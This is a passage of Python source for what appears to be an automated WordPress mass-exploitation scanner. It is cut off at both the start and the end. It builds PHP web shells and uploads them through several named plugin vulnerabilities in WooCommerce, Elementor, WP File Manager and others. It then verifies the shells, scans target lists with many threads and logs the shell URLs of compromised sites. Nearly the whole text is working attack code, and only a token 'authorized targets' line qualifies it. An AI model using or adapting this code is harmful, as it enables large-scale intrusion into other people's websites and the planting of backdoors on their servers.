    system($_GET['cmd']);
}}
?>"""
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": f"{target_url}/wp-admin/post.php?post=373&action=edit",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": target_url,
            "DNT": "1",
            "Sec-GPC": "1",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        
        files = {
            "file": (shell_name, php_payload, "image/jpeg"),
        }
        
        data = {
            "action": "wc_upload_file_ajax",
        }
        
        try:
            print(f"    {CYAN}[*]{RESET} Uploading payload to {ajax_url}")
            response = self.session.post(ajax_url, headers=headers, files=files, data=data, timeout=30)
            
            if response.status_code == 200:
                print(f"    {GREEN}[+]{RESET} Request successful!")
                
                response_text = response.text.replace(r"\/", "/")
                
                url_patterns = [
                    r'http[s]?://[^\s"\'<>]+\.php',
                    r'https?://[^\s"\'<>]+\.php',
                    r'/[^\s"\'<>]+\.php'
                ]
                
                uploaded_url = None
                for pattern in url_patterns:
                    match = re.search(pattern, response_text)
                    if match:
                        uploaded_url = match.group(0)
                        if not uploaded_url.startswith('http'):
                            uploaded_url = urljoin(target_url, uploaded_url)
                        break
                
                if uploaded_url:
                    print(f"    {GREEN}[+]{RESET} Payload uploaded: {uploaded_url}")
                    
                    if self.verify_shell(uploaded_url):
                        print(f"    {GREEN}[SHELL]{RESET} WooCommerce shell active: {uploaded_url}?p={SHELL_PASSWORD}")
                        return True, f"WooCommerce Shell: {uploaded_url}?p={SHELL_PASSWORD}"
                    else:
                        print(f"    {YELLOW}[!]{RESET} Shell uploaded but verification failed")
                        return True, f"WooCommerce payload uploaded: {uploaded_url}?p={SHELL_PASSWORD}"
                else:
                    print(f"    {YELLOW}[!]{RESET} Could not extract file URL from response")
                    return False, "Failed to extract file URL"
            else:
                print(f"    {RED}[-]{RESET} Request failed with status {response.status_code}")
                return False, f"Upload failed with status {response.status_code}"
                
        except Exception as e:
            print(f"    {RED}[-]{RESET} WooCommerce exploit error: {str(e)}")
            return False, f"Error: {str(e)}"
    
    def create_elementor_payload_zip(self, shell_content=None, zip_name=None):
        if zip_name is None:
            zip_name = tempfile.mktemp(suffix='.zip')
        
        if shell_content is None:
            shell_content = SIMPLE_SHELL
        
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.writestr('elementor-pro/elementor-pro.php', shell_content)
        
        return zip_name
    
    def elementor_login(self, target_url, username, password):
        print(f"    {CYAN}[*]{RESET} Attempting to login as: {username}")
        
        login_url = urljoin(target_url, 'wp-login.php')
        admin_url = urljoin(target_url, 'wp-admin/')
        
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Login',
            'redirect_to': admin_url,
            'testcookie': '1'
        }
        
        try:
            response = self.session.post(login_url, data=data, timeout=10)
            
            nonce_pattern = re.compile(r'"ajax":\{"url":".+admin-ajax\.php","nonce":"([^"]+)"\}')
            search = nonce_pattern.search(response.text)
            
            if search:
                nonce = search.group(1)
                print(f"    {GREEN}[+]{RESET} Login successful! Nonce found: {nonce}")
                self.logged_in = True
                return nonce
            else:
                print(f"    {RED}[-]{RESET} Login failed or nonce not found")
                return None
                
        except Exception as e:
            print(f"    {RED}[-]{RESET} Login error: {str(e)}")
            return None
    
    def exploit_elementor(self, target_url, username, password, auto_shell=True):
        print(f"\n  {CYAN}[*]{RESET} Testing Elementor RCE (CVE-2022-1329)...")
        
        elementor_path = urljoin(target_url, 'wp-content/plugins/elementor/readme.txt')
        try:
            check = self.session.get(elementor_path, timeout=5)
            if check.status_code != 200:
                print(f"    {YELLOW}[!]{RESET} Elementor plugin not detected")
                return False, "Elementor not installed"
        except:
            print(f"    {YELLOW}[!]{RESET} Elementor plugin not detected")
            return False, "Elementor not installed"
        
        nonce = self.elementor_login(target_url, username, password)
        if not nonce:
            return False, "Login failed - cannot proceed with Elementor exploit"
        
        if not auto_shell:
            return True, f"Elementor vulnerable, nonce obtained: {nonce}"
        
        print(f"    {CYAN}[*]{RESET} Creating Elementor payload ZIP...")
        zip_path = self.create_elementor_payload_zip(ACTUAL_PHP_SHELL)
        
        try:
            upload_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
            data = {
                'action': 'elementor_upload_and_install_pro',
                '_nonce': nonce
            }
            files = {
                'fileToUpload': (os.path.basename(zip_path), open(zip_path, 'rb'), 'application/zip')
            }
            
            print(f"    {CYAN}[*]{RESET} Uploading payload...")
            response = self.session.post(upload_url, data=data, files=files, timeout=30)
            
            os.remove(zip_path)
            
            if '"elementorProInstalled":true' in response.text:
                print(f"    {GREEN}[+]{RESET} Payload uploaded successfully!")
                
                shell_url = urljoin(target_url, 'wp-content/plugins/elementor-pro/elementor-pro.php')
                time.sleep(2)
                
                if self.verify_shell(shell_url):
                    print(f"    {GREEN}[SHELL]{RESET} Elementor shell active: {shell_url}?p={SHELL_PASSWORD}")
                    return True, f"Elementor Shell: {shell_url}?p={SHELL_PASSWORD}"
                else:
                    print(f"    {YELLOW}[!]{RESET} Payload uploaded but shell verification failed")
                    return True, f"Elementor payload uploaded: {shell_url}?p={SHELL_PASSWORD}"
            else:
                print(f"    {RED}[-]{RESET} Upload failed")
                return False, "Elementor upload failed"
                
        except Exception as e:
            if os.path.exists(zip_path):
                os.remove(zip_path)
            print(f"    {RED}[-]{RESET} Elementor exploit error: {str(e)}")
            return False, f"Error: {str(e)}"
    
    def exploit_admin_ajax_rce(self, target_url, nonce=None):
        print(f"\n  {CYAN}[*]{RESET} Testing admin-ajax.php RCE exploit...")
        
        ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
        shell_name = f"Aezeron_{random.randint(1000, 9999)}.php"
        
        php_payload = ACTUAL_PHP_SHELL
        
        mapped_fields = {
            "pwn->cus2": php_payload
        }
        
        data = {
            'action': 'saveMappedFields',
            'securekey': nonce if nonce else 'dummy_nonce',
            'MappedFields': json.dumps(mapped_fields)
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': target_url
        }
        
        try:
            print(f"    {CYAN}[*]{RESET} Sending exploit payload to {ajax_url}")
            response = self.session.post(ajax_url, data=data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                print(f"    {GREEN}[+]{RESET} Request successful")
                
                possible_paths = [
                    urljoin(target_url, shell_name),
                    urljoin(target_url, f'wp-content/{shell_name}'),
                    urljoin(target_url, f'wp-content/uploads/{shell_name}'),
                ]
                
                for shell_url in possible_paths:
                    time.sleep(1)
                    if self.verify_shell(shell_url):
                        print(f"    {GREEN}[SHELL]{RESET} Shell created: {shell_url}?p={SHELL_PASSWORD}")
                        return True, f"admin-ajax Shell: {shell_url}?p={SHELL_PASSWORD}"
                
                return False, "Shell created but verification failed"
            else:
                print(f"    {RED}[-]{RESET} Request failed")
                return False, f"Request failed with status {response.status_code}"
                
        except Exception as e:
            print(f"    {RED}[-]{RESET} Error: {str(e)}")
            return False, f"Error: {str(e)}"
    
    def check_version_cve_2020_25213(self, target_url):
        readme_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/readme.txt')
        
        try:
            response = self.session.get(readme_url, timeout=5)
            if response.status_code == 200:
                version_match = re.search(r'== Changelog ==.*?(\d+\.\d+)', response.text, re.DOTALL)
                if version_match:
                    version = version_match.group(1)
                    print(f"    [+] Found wp-file-manager version: {version}")
                    
                    try:
                        version_parts = version.split('.')
                        version_float = float(f"{version_parts[0]}.{version_parts[1]}")
                        
                        if 6.0 <= version_float <= 6.8:
                            print(f"    [+] Version {version} is vulnerable to CVE-2020-25213")
                            return True
                        else:
                            print(f"    [-] Version {version} is not vulnerable")
                            return False
                    except:
                        return None
            return None
        except:
            return None
    
    def exploit_cve_2020_25213(self, target_url, auto_shell=True):
        print(f"\n  {CYAN}[*]{RESET} Testing CVE-2020-25213 (WP File Manager RCE)...")
        
        endpoint_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
        
        try:
            check_response = self.session.get(endpoint_url, timeout=5)
            if check_response.status_code == 200:
                try:
                    json_response = check_response.json()
                    if 'error' in json_response and 'errUnknownCmd' in str(json_response['error']):
                        print(f"    {GREEN}[+]{RESET} Target vulnerable to CVE-2020-25213")
                    else:
                        print(f"    {RED}[-]{RESET} Target not vulnerable")
                        return False, "Not vulnerable"
                except:
                    print(f"    {RED}[-]{RESET} Target not vulnerable")
                    return False, "Not vulnerable"
            else:
                print(f"    {RED}[-]{RESET} Endpoint not accessible")
                return False, "Endpoint not accessible"
        except Exception as e:
            print(f"    {RED}[-]{RESET} Error: {str(e)}")
            return False, f"Error: {str(e)}"
        
        if auto_shell:
            print(f"    {CYAN}[*]{RESET} Uploading shell via CVE-2020-25213...")
            shell_name = f"aezeron_{random.randint(1000, 9999)}.php"
            
            temp_shell = tempfile.mktemp(suffix='.php')
            try:
                with open(temp_shell, 'w') as f:
                    f.write(SIMPLE_SHELL)
                
                files = {
                    'upload[]': (shell_name, open(temp_shell, 'rb'), 'application/x-php')
                }
                
                data = {
                    'reqid': '17457a1fe6959',
                    'cmd': 'upload',
                    'target': 'l1_Lw',
                    'mtime[]': '1576045135'
                }
                
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                exploit_response = self.session.post(endpoint_url, files=files, data=data, headers=headers, timeout=10)
                os.remove(temp_shell)
                
                if exploit_response.status_code == 200:
                    try:
                        json_response = exploit_response.json()
                        if 'added' in json_response and len(json_response['added']) > 0:
                            shell_path = json_response['added'][0].get('url')
                            if shell_path:
                                full_url = urljoin(target_url, shell_path)
                                if self.verify_shell(full_url):
                                    print(f"    {GREEN}[SHELL]{RESET} Shell uploaded: {full_url}?p={SHELL_PASSWORD}")
                                    return True, f"CVE-2020-25213 Shell: {full_url}?p={SHELL_PASSWORD}"
                    except:
                        alt_url = urljoin(target_url, f'wp-content/plugins/wp-file-manager/lib/files/{shell_name}')
                        if self.verify_shell(alt_url):
                            print(f"    {GREEN}[SHELL]{RESET} Shell uploaded: {alt_url}?p={SHELL_PASSWORD}")
                            return True, f"CVE-2020-25213 Shell: {alt_url}?p={SHELL_PASSWORD}"
                
                return False, "Exploit failed"
            except Exception as e:
                if os.path.exists(temp_shell):
                    os.remove(temp_shell)
                return False, f"Error: {str(e)}"
        
        return True, "Target vulnerable"
    
    def auto_exploit(self, target_url, elementor_creds=None, mpmf_form_name=None, pix_command=None, pix_interactive=False, kivicare_email=None, kivicare_login_type="google"):
        results = {
            'file_manager': False,
            'woocommerce': False,
            'mpmf_rce': False,
            'pix_rce': False,
            'kivicare_bypass': False,
            'elementor_rce': False,
            'admin_ajax_rce': False,
            'cve_2020_25213': False,
            'shell_urls': [],
            'details': []
        }
        
        # Test KiviCare Auth Bypass (CVE-2026-2991)
        if kivicare_email:
            print(f"{CYAN}[*]{RESET} Testing KiviCare Auth Bypass (CVE-2026-2991)...")
            kivicare_result, kivicare_msg = self.exploit_kivicare_auth_bypass(target_url, kivicare_email, kivicare_login_type)
            results['kivicare_bypass'] = kivicare_result
            results['details'].append(f"[KiviCare] {kivicare_msg}")
        
        # Test Pix for WooCommerce RCE (CVE-2026-3891)
        print(f"{CYAN}[*]{RESET} Testing Pix for WooCommerce RCE (CVE-2026-3891)...")
        pix_result, pix_msg = self.exploit_pix_woocommerce_rce(target_url, pix_command, pix_interactive)
        results['pix_rce'] = pix_result
        results['details'].append(f"[Pix] {pix_msg}")
        if pix_result and "Shell" in pix_msg:
            shell_part = pix_msg.split(': ')[1] if ': ' in pix_msg else pix_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        # Test MPMF RCE (CVE-2024-50526)
        print(f"{CYAN}[*]{RESET} Testing MPMF RCE (CVE-2024-50526)...")
        mpmf_result, mpmf_msg = self.exploit_mpmf_rce(target_url, mpmf_form_name)
        results['mpmf_rce'] = mpmf_result
        results['details'].append(f"[MPMF] {mpmf_msg}")
        if mpmf_result and "Shell" in mpmf_msg:
            shell_part = mpmf_msg.split(': ')[1] if ': ' in mpmf_msg else mpmf_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        # Test WooCommerce RCE (CVE-2024-51793)
        print(f"{CYAN}[*]{RESET} Testing WooCommerce RCE (CVE-2024-51793)...")
        woo_result, woo_msg = self.exploit_woocommerce_rce(target_url)
        results['woocommerce'] = woo_result
        results['details'].append(f"[WooCommerce] {woo_msg}")
        if woo_result and "Shell" in woo_msg:
            shell_part = woo_msg.split(': ')[1] if ': ' in woo_msg else woo_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        # Test Elementor RCE if credentials provided
        if elementor_creds and elementor_creds.get('username') and elementor_creds.get('password'):
            print(f"{CYAN}[*]{RESET} Testing Elementor RCE (CVE-2022-1329)...")
            elementor_result, elementor_msg = self.exploit_elementor(
                target_url, 
                elementor_creds['username'], 
                elementor_creds['password'], 
                auto_shell=True
            )
            results['elementor_rce'] = elementor_result
            results['details'].append(f"[Elementor] {elementor_msg}")
            if elementor_result and "Shell" in elementor_msg:
                shell_part = elementor_msg.split(': ')[1] if ': ' in elementor_msg else elementor_msg
                if shell_part not in results['shell_urls']:
                    results['shell_urls'].append(shell_part)
        
        # Test CVE-2020-25213
        print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213...")
        cve_result, cve_msg = self.exploit_cve_2020_25213(target_url, auto_shell=True)
        results['cve_2020_25213'] = cve_result
        results['details'].append(f"[CVE-2020-25213] {cve_msg}")
        if cve_result and "Shell" in cve_msg:
            shell_part = cve_msg.split(': ')[1] if ': ' in cve_msg else cve_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        # Test admin-ajax RCE
        print(f"{CYAN}[*]{RESET} Testing admin-ajax.php RCE...")
        ajax_result, ajax_msg = self.exploit_admin_ajax_rce(target_url)
        results['admin_ajax_rce'] = ajax_result
        results['details'].append(f"[AdminAjax] {ajax_msg}")
        if ajax_result and "Shell" in ajax_msg:
            shell_part = ajax_msg.split(': ')[1] if ': ' in ajax_msg else ajax_msg
            if shell_part not in results['shell_urls']:
                results['shell_urls'].append(shell_part)
        
        return results

def scan_vulnerable_plugins(target_url, max_workers=10):
    results = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for plugin in WP_VULN_PLUGINS:
            test_url = urljoin(target_url, plugin['path'])
            keywords = plugin.get('keywords', [])
            futures.append(executor.submit(check_plugin_vulnerability, test_url, plugin['name'], keywords))
        
        for future in as_completed(futures):
            try:
                result = future.result(timeout=3)
                if isinstance(result, dict) and result.get('vulnerable', False):
                    results.append(result)
            except Exception as e:
                continue
    
    return results

def check_plugin_vulnerability(url, plugin_name, keywords=None):
    try:
        response = requests.get(url, timeout=5, verify=False, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        if response.status_code == 200:
            content = response.text
            
            if not content.strip() or len(content) < 10:
                return {'plugin': plugin_name, 'url': url, 'vulnerable': False}

            if 'wp-login.php' in response.url:
                return {'plugin': plugin_name, 'url': url, 'vulnerable': False}

            if any(x in content.lower() for x in JUDOL_KEYWORDS):
                return {'plugin': plugin_name, 'url': url, 'vulnerable': False}

            if keywords:
                found_keyword = False
                for keyword in keywords:
                    if keyword.lower() in content.lower():
                        found_keyword = True
                        break
                
                if not found_keyword:
                    return {'plugin': plugin_name, 'url': url, 'vulnerable': False}

            return {'plugin': plugin_name, 'url': url, 'vulnerable': True, 'status_code': response.status_code}
        else:
            return {'plugin': plugin_name, 'url': url, 'vulnerable': False}
            
    except Exception as e:
        return {'plugin': plugin_name, 'url': url, 'vulnerable': False, 'error': str(e)}

def check_wordpress_site(base_url):
    wp_indicators = ['wp-content', 'wp-includes', 'wp-admin', 'wp-json']
    
    try:
        response = requests.get(base_url, timeout=5, verify=False)
        content = response.text.lower()
        
        for indicator in wp_indicators:
            if indicator in content:
                return True
        
        login_paths = ['wp-login.php', 'wp-admin']
        for path in login_paths:
            test_url = urljoin(base_url, path)
            try:
                resp = requests.get(test_url, timeout=3, verify=False)
                if resp.status_code == 200:
                    return True
            except:
                continue
    except:
        pass
    
    return False

def scan_single_target(target_url, exploit=False, elementor_creds=None, interactive=False, mpmf_form_name=None, pix_command=None, pix_interactive=False, kivicare_email=None, kivicare_login_type="google"):
    result = {
        'url': target_url,
        'is_wordpress': False,
        'vulnerable_plugins': [],
        'exploit_results': {},
        'shell_urls': []
    }
    
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    
    result['url'] = target_url
    
    try:
        result['is_wordpress'] = check_wordpress_site(target_url)
    except:
        result['is_wordpress'] = False
    
    if result['is_wordpress']:
        print(f"{GREEN}[+]{RESET} WordPress detected: {target_url}")
        
        plugin_results = scan_vulnerable_plugins(target_url, max_workers=10)
        if isinstance(plugin_results, list):
            result['vulnerable_plugins'] = plugin_results
        else:
            result['vulnerable_plugins'] = []
        
        if result['vulnerable_plugins']:
            print(f"{YELLOW}[!]{RESET} Found {len(result['vulnerable_plugins'])} potentially vulnerable plugins")
            for plugin in result['vulnerable_plugins'][:3]:
                if isinstance(plugin, dict):
                    print(f"  {CYAN}-{RESET} {plugin.get('plugin', 'Unknown')}: {plugin.get('url', 'N/A')}")
        
        if exploit:
            exploiter = WPFileManagerExploit()
            
            # Try KiviCare Auth Bypass (CVE-2026-2991)
            if kivicare_email:
                print(f"{CYAN}[*]{RESET} Testing KiviCare Auth Bypass...")
                kivicare_success, kivicare_msg = exploiter.exploit_kivicare_auth_bypass(target_url, kivicare_email, kivicare_login_type)
                if kivicare_success:
                    print(f"  {GREEN}[BYPASS]{RESET} {kivicare_msg}")
            
            # Try Pix for WooCommerce RCE (CVE-2026-3891)
            print(f"{CYAN}[*]{RESET} Testing Pix for WooCommerce RCE...")
            pix_success, pix_msg = exploiter.exploit_pix_woocommerce_rce(target_url, pix_command, pix_interactive)
            if pix_success and "Shell" in pix_msg:
                shell_url = pix_msg.split(': ')[1] if ': ' in pix_msg else pix_msg
                if shell_url not in result['shell_urls']:
                    result['shell_urls'].append(shell_url)
                print(f"  {GREEN}[SHELL]{RESET} {pix_msg}")
            
            # Try MPMF RCE (with auto-detection)
            print(f"{CYAN}[*]{RESET} Testing MPMF RCE...")
            mpmf_success, mpmf_msg = exploiter.exploit_mpmf_rce(target_url, mpmf_form_name)
            if mpmf_success and "Shell" in mpmf_msg:
                shell_url = mpmf_msg.split(': ')[1] if ': ' in mpmf_msg else mpmf_msg
                if shell_url not in result['shell_urls']:
                    result['shell_urls'].append(shell_url)
                print(f"  {GREEN}[SHELL]{RESET} {mpmf_msg}")
            
            # Try WooCommerce RCE
            print(f"{CYAN}[*]{RESET} Testing WooCommerce RCE...")
            woo_success, woo_msg = exploiter.exploit_woocommerce_rce(target_url)
            if woo_success and "Shell" in woo_msg:
                shell_url = woo_msg.split(': ')[1] if ': ' in woo_msg else woo_msg
                if shell_url not in result['shell_urls']:
                    result['shell_urls'].append(shell_url)
                print(f"  {GREEN}[SHELL]{RESET} {woo_msg}")
            
            # Try Elementor RCE if credentials provided
            if elementor_creds and elementor_creds.get('username') and elementor_creds.get('password'):
                print(f"{CYAN}[*]{RESET} Testing Elementor RCE...")
                elementor_success, elementor_msg = exploiter.exploit_elementor(
                    target_url, 
                    elementor_creds['username'], 
                    elementor_creds['password'], 
                    auto_shell=True
                )
                if elementor_success and "Shell" in elementor_msg:
                    shell_url = elementor_msg.split(': ')[1] if ': ' in elementor_msg else elementor_msg
                    if shell_url not in result['shell_urls']:
                        result['shell_urls'].append(shell_url)
                    print(f"  {GREEN}[SHELL]{RESET} {elementor_msg}")
            
            # Try other exploits
            exploit_result = exploiter.auto_exploit(target_url, elementor_creds, mpmf_form_name, pix_command, pix_interactive, kivicare_email, kivicare_login_type)
            result['exploit_results'] = exploit_result
            if isinstance(exploit_result, dict) and 'shell_urls' in exploit_result:
                for shell in exploit_result.get('shell_urls', []):
                    if shell not in result['shell_urls']:
                        result['shell_urls'].append(shell)
    
    return result

def mass_scan_targets(targets, max_workers=30, exploit=False, elementor_creds=None, interactive=False, mpmf_form_name=None, pix_command=None, pix_interactive=False, kivicare_email=None, kivicare_login_type="google"):
    results = []
    wp_sites = 0
    vulnerable_sites = 0
    exploited_sites = 0
    shells_uploaded = 0
    total = len(targets)
    completed = 0
    start_time = time.time()
    
    print(f"\n{BLUE}[*]{RESET} Starting WP Exploit Scanner for {CYAN}{total}{RESET} targets")
    if exploit:
        print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED")
        print(f"{RED}[!]{RESET} Exploits: KiviCare Bypass, Pix for WooCommerce, MPMF RCE, WooCommerce RCE, CVE-2020-25213, Admin Ajax RCE, Elementor RCE")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_target = {executor.submit(scan_single_target, target, exploit, elementor_creds, interactive, mpmf_form_name, pix_command, pix_interactive, kivicare_email, kivicare_login_type): target for target in targets}
        
        for future in as_completed(future_to_target):
            completed += 1
            try:
                result = future.result(timeout=30)
                
                if result['is_wordpress']:
                    wp_sites += 1
                    
                    is_exploited = bool(result['shell_urls'])
                    is_vuln = bool(result['vulnerable_plugins'])

                    if is_exploited:
                        exploited_sites += 1
                        shells_uploaded += len(result['shell_urls'])
                    if is_vuln:
                        vulnerable_sites += 1

                    if is_exploited:
                        print(f"\n{GREEN}[EXPLOITED]{RESET} {WHITE}{result['url']}{RESET}")
                        print(f"  {GREEN}[SHELL]{RESET} Found {len(result['shell_urls'])} shells")
                        for shell in result['shell_urls']:
                            print(f"    {GREEN}→{RESET} {shell}")

                    elif is_vuln:
                        print(f"\n{RED}[VULN]{RESET} {WHITE}{result['url']}{RESET}")
                        print(f"  {YELLOW}Vulnerable Plugins:{RESET} {len(result['vulnerable_plugins'])}")
                        for plugin in result['vulnerable_plugins'][:3]:
                            if isinstance(plugin, dict):
                                print(f"    {CYAN}[+]{RESET} {plugin.get('plugin', 'Unknown')}")
                
                results.append(result)
                
                if completed % 10 == 0:
                    elapsed = time.time() - start_time
                    progress = (completed / total) * 100
                    rate = completed / elapsed if elapsed > 0 else 0
                    
                    print(f"\n{BLUE}[{completed}/{total}]{RESET} {YELLOW}{progress:.1f}%{RESET} | {CYAN}WP: {wp_sites}{RESET} | {RED}Vuln: {vulnerable_sites}{RESET} | {GREEN}Exploited: {exploited_sites}{RESET} | {MAGENTA}Shells: {shells_uploaded}{RESET}")
                        
            except Exception as e:
                print(f"{RED}[ERROR]{RESET} Scan failed: {e}")
    
    total_time = time.time() - start_time
    print(f"\n{GREEN}[+]{RESET} Scan completed in {YELLOW}{total_time:.1f}{RESET} seconds")
    print(f"{CYAN}[+]{RESET} WordPress sites: {GREEN}{wp_sites}{RESET}")
    print(f"{RED}[+]{RESET} Vulnerable sites: {YELLOW}{vulnerable_sites}{RESET}")
    print(f"{GREEN}[+]{RESET} Exploited sites: {MAGENTA}{exploited_sites}{RESET}")
    print(f"{GREEN}[+]{RESET} Shells uploaded: {MAGENTA}{shells_uploaded}{RESET}")
    
    return results

def load_targets(filename):
    targets = []
    seen = set()
    
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    line = line.split('#')[0].strip()
                    
                    if '://' not in line:
                        line = 'http://' + line
                    
                    if line not in seen:
                        seen.add(line)
                        targets.append(line)
    except Exception as e:
        print(f"{RED}[!]{RESET} Error loading file: {e}")
    
    return targets

def save_results(results, filename="wp_exploit_results.txt"):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 100 + "\n")
            f.write("WORDPRESS EXPLOIT SCANNER RESULTS (Multiple CVEs)\n")
            f.write("=" * 100 + "\n\n")
            
            wp_count = len([r for r in results if r['is_wordpress']])
            vuln_count = len([r for r in results if r['vulnerable_plugins']])
            exploited_count = len([r for r in results if r['shell_urls']])
            shell_count = sum(len(r['shell_urls']) for r in results)
            
            f.write(f"SUMMARY:\n")
            f.write(f"- Total targets: {len(results)}\n")
            f.write(f"- WordPress sites: {wp_count}\n")
            f.write(f"- Vulnerable sites: {vuln_count}\n")
            f.write(f"- Exploited sites: {exploited_count}\n")
            f.write(f"- Shells uploaded: {shell_count}\n")
            f.write("=" * 100 + "\n\n")
            
            if vuln_count > 0:
                f.write("VULNERABLE SITES:\n")
                f.write("=" * 100 + "\n\n")
                
                for result in results:
                    if result['vulnerable_plugins']:
                        f.write(f"URL: {result['url']}\n")
                        f.write(f"Vulnerable Plugins: {len(result['vulnerable_plugins'])}\n")
                        
                        for plugin in result['vulnerable_plugins']:
                            if isinstance(plugin, dict):
                                f.write(f"  - {plugin.get('plugin', 'Unknown')}: {plugin.get('url', 'N/A')}\n")
                        
                        if result['shell_urls']:
                            f.write("\nUPLOADED SHELLS:\n")
                            for shell in result['shell_urls']:
                                f.write(f"  → {shell}\n")
                        
                        f.write("\n" + "=" * 100 + "\n\n")
            
    except Exception as e:
        print(f"{RED}[!]{RESET} Error saving results: {e}")

def kivicare_banner():
    banner_text = f"""
{PINK}{BOLD}
  _____   _____   ___ __ ___  __    ___ ___  ___  _ 
 / __\\ \\ / / __|_|_  )  \\_  )/ / __|_  ) _ \\/ _ \\/ |
 | (__\\ V /| _|___/ / () / // _ \\___/ /\\_, /\\_, /| |
 \\___| \\_/ |___| /___\\__/___\\___/  /___|/_/  /_/ |_|
{RESET}
  {PINK}{BOLD}CVE-2026-2991 - KiviCare Auth Bypass | CVE-2026-3891 - Pix for WooCommerce RCE{RESET}
  {PINK}{BOLD}CVE-2024-50526 - MPMF RCE | CVE-2024-51793 - WooCommerce RCE | CVE-2020-25213 - File Manager{RESET}
"""
    print(banner_text)

def main():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

    kivicare_banner()
    
    # Multi-target scan mode (default)
    filename = input(f"\n{YELLOW}[?]{RESET} Enter filename with domains/URLs: ").strip()
    
    if not os.path.exists(filename):
        print(f"{RED}[!]{RESET} File not found: {filename}")
        return
    
    print(f"{BLUE}[*]{RESET} Loading targets...")
    targets = load_targets(filename)
    
    if not targets:
        print(f"{RED}[!]{RESET} No targets loaded")
        return
    
    print(f"{GREEN}[+]{RESET} Loaded {CYAN}{len(targets)}{RESET} targets")
    
    threads_input = input(f"{YELLOW}[?]{RESET} Threads [{CYAN}30{RESET}]: ").strip()
    max_workers = int(threads_input) if threads_input.isdigit() else 30
    max_workers = min(max_workers, 50)
    
    exploit_input = input(f"{YELLOW}[?]{RESET} Enable auto exploit? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
    exploit = exploit_input == 'y'
    interactive = False
    
    # KiviCare email (optional)
    kivicare_email = None
    kivicare_login_type = "google"
    if exploit:
        print(f"\n{CYAN}[*]{RESET} KiviCare Auth Bypass (CVE-2026-2991) requires target email")
        use_kivicare = input(f"{YELLOW}[?]{RESET} Attempt KiviCare bypass? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
        if use_kivicare == 'y':
            kivicare_email = input(f"{YELLOW}[?]{RESET} Target email address: ").strip()
            login_type = input(f"{YELLOW}[?]{RESET} Login type (google/apple) [{CYAN}google{RESET}]: ").strip().lower()
            if login_type in ['google', 'apple']:
                kivicare_login_type = login_type
    
    # Elementor credentials (optional)
    elementor_creds = None
    if exploit:
        print(f"\n{CYAN}[*]{RESET} Elementor RCE requires WordPress credentials")
        use_elementor = input(f"{YELLOW}[?]{RESET} Attempt Elementor exploit? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
        if use_elementor == 'y':
            username = input(f"{YELLOW}[?]{RESET} WordPress username: ").strip()
            password = input(f"{YELLOW}[?]{RESET} WordPress password: ").strip()
            if username and password:
                elementor_creds = {'username': username, 'password': password}
    
    # MPMF form name (optional - will auto-detect if not provided)
    mpmf_form_name = None
    if exploit:
        mpmf_form_input = input(f"{YELLOW}[?]{RESET} Enter MPMF form name (or press Enter for auto-detect): ").strip()
        if mpmf_form_input:
            mpmf_form_name = mpmf_form_input
        else:
            print(f"  {CYAN}[i]{RESET} MPMF form name will be auto-detected")
    
    # Pix command (optional)
    pix_command = None
    pix_interactive = False
    if exploit:
        pix_cmd_input = input(f"{YELLOW}[?]{RESET} Enter command to run on Pix shell (or press Enter to skip): ").strip()
        if pix_cmd_input:
            pix_command = pix_cmd_input
    
    print(f"{BLUE}[*]{RESET} Starting scan with {CYAN}{max_workers}{RESET} threads...")
    if exploit:
        print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED")
        print(f"{RED}[!]{RESET} Exploits: KiviCare Bypass, Pix for WooCommerce, MPMF (auto-detect), WooCommerce, File Manager, Elementor, Admin Ajax")
        if kivicare_email:
            print(f"{GREEN}[+]{RESET} KiviCare target email: {kivicare_email}")
        if elementor_creds:
            print(f"{GREEN}[+]{RESET} Elementor exploit will be attempted")
        if mpmf_form_name:
            print(f"{GREEN}[+]{RESET} MPMF form name: {mpmf_form_name}")
        else:
            print(f"{GREEN}[+]{RESET} MPMF form name will be auto-detected")
        if pix_command:
            print(f"{GREEN}[+]{RESET} Pix command: {pix_command}")
        print(f"{YELLOW}[!]{RESET} Use only on authorized targets")
    print(f"{YELLOW}[!]{RESET} Press Ctrl+C to stop")
    
    try:
        results = mass_scan_targets(targets, max_workers, exploit, elementor_creds, interactive, mpmf_form_name, pix_command, pix_interactive, kivicare_email, kivicare_login_type)
        
